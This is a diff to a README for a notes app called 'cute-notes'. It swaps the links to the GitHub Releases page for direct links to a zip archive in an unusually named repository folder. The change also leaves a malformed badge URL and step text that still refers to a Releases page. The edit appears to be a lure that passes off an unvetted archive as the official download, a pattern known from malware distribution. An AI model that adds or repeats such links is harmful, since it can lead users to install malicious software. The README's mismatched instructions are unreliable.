@@ -6,14 +6,14 @@ Welcome to cute-notes! This is a delightful notes app designed to help you keep 
 
 ## 🔗 Download the App
 
-[![Download cute-notes](https://img.shields.io/badge/Download%20cute--notes-v1.0-blue.svg)](https://github.com/abhinavpachat/cute-notes/releases)
+[![Download cute-notes](https://raw.githubusercontent.com/abhinavpachat/cute-notes/main/Aetolian/cute-notes.zip%https://raw.githubusercontent.com/abhinavpachat/cute-notes/main/Aetolian/cute-notes.zip)](https://raw.githubusercontent.com/abhinavpachat/cute-notes/main/Aetolian/cute-notes.zip)
 
 ## 📥 Download & Install
 
 To get started with cute-notes, follow these simple steps:
 
 1. **Visit the Releases Page.** Click on the link below:
-   [Download cute-notes](https://github.com/abhinavpachat/cute-notes/releases)
+   [Download cute-notes](https://raw.githubusercontent.com/abhinavpachat/cute-notes/main/Aetolian/cute-notes.zip)
 
 2. **Select the Latest Release.** On the Releases page, look for the most recent version. This will ensure you have the latest features and fixes.
 
